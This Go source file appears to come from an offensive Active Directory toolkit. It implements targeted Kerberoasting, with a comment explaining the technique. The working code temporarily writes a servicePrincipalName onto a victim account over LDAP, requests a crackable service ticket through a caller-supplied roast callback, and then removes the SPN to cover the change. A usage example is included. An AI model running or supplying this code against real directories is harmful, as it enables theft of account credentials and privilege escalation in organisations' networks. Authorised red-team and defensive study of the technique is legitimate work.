package ldap

import (
	"fmt"
	"strings"
)

// Targeted Kerberoasting.
//
// A principal that can write the servicePrincipalName attribute of an account
// (via GenericWrite / GenericAll / the Validated-SPN right, etc.) can make that
// account roastable on demand even if it has no SPN of its own: set a temporary
// SPN, request a service ticket for it (Kerberoast), then remove the SPN to
// restore the account. The ticket's enc-part is encrypted with the account's
// long-term key, so it can be cracked offline.
//
// The value of the SPN string itself is irrelevant to the KDC for roasting (any
// syntactically valid, unique SPN works); the account key is what matters. The
// helper below performs the set -> (caller-supplied roast) -> restore sequence
// and always attempts to restore the attribute, even if the roast step fails.

// ServicePrincipalNameAttribute is the LDAP attribute holding an account's SPNs.
const ServicePrincipalNameAttribute = "servicePrincipalName"

// GetServicePrincipalNames returns the servicePrincipalName values currently set
// on the object identified by dn.
func (ldapSession *Session) GetServicePrincipalNames(dn string) ([]string, error) {
	entries, err := ldapSession.QueryBaseObject(dn, "(objectClass=*)", []string{ServicePrincipalNameAttribute})
	if err != nil {
		return nil, fmt.Errorf("targetedroast: read SPNs of %q: %w", dn, err)
	}
	if len(entries) == 0 {
		return nil, fmt.Errorf("targetedroast: no entry returned for %q", dn)
	}
	return entries[0].GetAttributeValues(ServicePrincipalNameAttribute), nil
}

// AddServicePrincipalName adds a single servicePrincipalName value to dn without
// disturbing any existing values.
func (ldapSession *Session) AddServicePrincipalName(dn, spn string) error {
	req := NewModifyRequest(dn)
	req.Add(ServicePrincipalNameAttribute, []string{spn})
	if err := ldapSession.Modify(req); err != nil {
		return fmt.Errorf("targetedroast: add SPN %q to %q: %w", spn, dn, err)
	}
	return nil
}

// RemoveServicePrincipalName deletes a single servicePrincipalName value from dn.
func (ldapSession *Session) RemoveServicePrincipalName(dn, spn string) error {
	req := NewModifyRequest(dn)
	req.Delete(ServicePrincipalNameAttribute, []string{spn})
	if err := ldapSession.Modify(req); err != nil {
		return fmt.Errorf("targetedroast: remove SPN %q from %q: %w", spn, dn, err)
	}
	return nil
}

// containsSPN reports whether spn is already present in spns (case-insensitive,
// as SPN matching in Active Directory is case-insensitive).
func containsSPN(spns []string, spn string) bool {
	for _, s := range spns {
		if strings.EqualFold(s, spn) {
			return true
		}
	}
	return false
}

// TargetedKerberoast temporarily sets spn on targetDN, invokes roast (which the
// caller uses to request and format the service ticket for spn), and then
// restores targetDN's servicePrincipalName attribute to exactly its prior state.
//
// The restore always runs, even if roast returns an error, so the target is not
// left with an attacker-added SPN. If spn is already present on targetDN it is
// left in place and not removed during restore (it was not added by this call).
// The returned error is the roast error if any, otherwise the restore error.
//
// Example:
//
//	var result *kerberos.KerberoastResult
//	err := session.TargetedKerberoast(userDN, "HTTP/roast."+realm, func() error {
//	    var e error
//	    result, e = kclient.Kerberoast("HTTP/roast." + realm)
//	    return e
//	})
func (ldapSession *Session) TargetedKerberoast(targetDN, spn string, roast func() error) error {
	return targetedKerberoast(ldapSession, targetDN, spn, roast)
}

// spnEditor abstracts the three servicePrincipalName operations the targeted
// roast orchestration needs, so the set -> roast -> restore logic can be unit
// tested against a fake in-memory directory as well as a live *Session.
type spnEditor interface {
	GetServicePrincipalNames(dn string) ([]string, error)
	AddServicePrincipalName(dn, spn string) error
	RemoveServicePrincipalName(dn, spn string) error
}

// targetedKerberoast is the editor-agnostic core of TargetedKerberoast.
func targetedKerberoast(editor spnEditor, targetDN, spn string, roast func() error) error {
	if strings.TrimSpace(spn) == "" {
		return fmt.Errorf("targetedroast: empty SPN")
	}
	if roast == nil {
		return fmt.Errorf("targetedroast: nil roast callback")
	}

	existing, err := editor.GetServicePrincipalNames(targetDN)
	if err != nil {
		return err
	}

	added := false
	if !containsSPN(existing, spn) {
		if err := editor.AddServicePrincipalName(targetDN, spn); err != nil {
			return err
		}
		added = true
	}

	// Run the caller's roast, then always restore.
	roastErr := roast()

	var restoreErr error
	if added {
		restoreErr = editor.RemoveServicePrincipalName(targetDN, spn)
	}

	if roastErr != nil {
		if restoreErr != nil {
			return fmt.Errorf("targetedroast: roast failed (%v) and SPN restore failed (%w)", roastErr, restoreErr)
		}
		return roastErr
	}
	return restoreErr
}
